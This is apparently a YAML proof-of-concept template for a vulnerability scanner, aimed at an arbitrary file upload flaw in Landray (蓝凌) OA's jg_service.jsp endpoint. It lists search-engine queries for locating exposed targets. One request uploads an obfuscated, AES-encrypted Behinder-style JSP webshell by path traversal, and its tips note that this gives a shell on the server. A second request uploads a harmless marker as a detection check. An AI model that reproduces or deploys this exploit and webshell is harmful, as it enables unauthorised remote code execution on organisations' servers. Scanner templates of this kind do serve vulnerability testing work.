detail:
  author: 
  links:
    - x
  vulnerability:
    level: critical
    fofa-query: app="Landray-OA系统"
    hunter-query: app.name="Landray 蓝凌OA"
    quake-query: favicon:"302464c3f6207d57240649926cfc7bd4"
    zoomeye-query: app:"蓝凌数字OA"
    threatbook-query: 
    cve: 
    cnvd:
    tips:   /resource/4ndex.jsp 冰蝎rebeyond 存在txt默认getshell    | /resource/html/4ndex.txt  |  ../../ekp/resource/html/4ndex.txt
    
name: poc-yaml-Landray-jg_service.jsp-upload
manual: true
transport: http
set:
    s1: randomInt(1000000000, 9000000000)
    s2: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /sys/attachment/sys_att_main/jg_service.jsp
            headers:
              Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
              Accept-Language: zh-CN,zh;q=0.9
              Content-Encoding: deflate
              Content-Disposition: attachment; filename="filename.jpg"
              Content-Type: application/octet-stream
              Connection: close
            body: "aaaaaaaaaaaaaaaa128             0               1954            DBSTEP=REJTVEVQ\r\nDIRECTORY=\r\nOPTION=U0FWRUFTSFRNTA==\r\nHTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlLzRuZGV4LmpzcA==\r\nRECORDID=\r\ntestpage<%! public byte[] A7S0u(String Strings,String k) throws Exception { javax.crypto.Cipher BIEfFK = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");BIEfFK.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = \"\";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);bytes =  (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), Strings);}byte[] result = (byte[]) BIEfFK.getClass()./*ZKYgVtJWcn*/getDeclaredMethod/*ZKYgVtJWcn*/(\"doFinal\", new Class[]{byte[].class}).invoke(BIEfFK,new Object[]{bytes});return result;} %><%  try {  String Kxp33Cl = \"e45e329feb5d925b\";  session.putValue(\"u\", Kxp33Cl);  byte[] Iq85zm1 = A7S0u (request.getReader().readLine(),Kxp33Cl);  java./*ZKYgVtJWcn*/lang./*ZKYgVtJWcn*/reflect.Method A7S0u = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*ZKYgVtJWcn*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class);  A7S0u.setAccessible(true);  Class i = (Class)A7S0u.invoke(Thread.currentThread()./*ZKYgVtJWcn*/getContextClassLoader(), Iq85zm1 , 0, Iq85zm1.length);  Object QdAv = i./*ZKYgVtJWcn*/newInstance();  QdAv.equals(pageContext); } catch (Exception e) {response.sendError(404);} %>"          
        expression: response.status == 200 && response.body_string.contains("STATUS=")

    r1:
        request:
            cache: true
            method: GET
            path: /resource/4ndex.jsp
            headers:
            body:   
        expression: response.status == 200 && response.body_string.contains("STATUS=")

    r2:
        request:
            cache: true
            method: POST
            path: /sys/attachment/sys_att_main/jg_service.jsp
            headers:
              Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
              Accept-Language: zh-CN,zh;q=0.9
              Content-Encoding: deflate
              Content-Disposition: attachment; filename="filename.jpg"
              Content-Type: application/octet-stream
              Connection: close
            body: "aaaaaaaaaaaaaaaa128             0               25              DBSTEP=REJTVEVQ\r\nDIRECTORY=\r\nOPTION=U0FWRUFTSFRNTA==\r\nHTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL2h0bWwvNG5kZXgudHh0\r\nRECORDID=\r\n<% out.print(\"4ra1n\"); %>"            
        expression: response.status == 200 && response.body_string.contains("STATUS=")

    r3:
        request:
            cache: true
            method: GET
            path: /resource/html/4ndex.txt
            headers:
            body:   
        expression: response.status == 200 && response.body_string.contains("4ra1n")


expression: (r0() && r1() || r2() && r3())
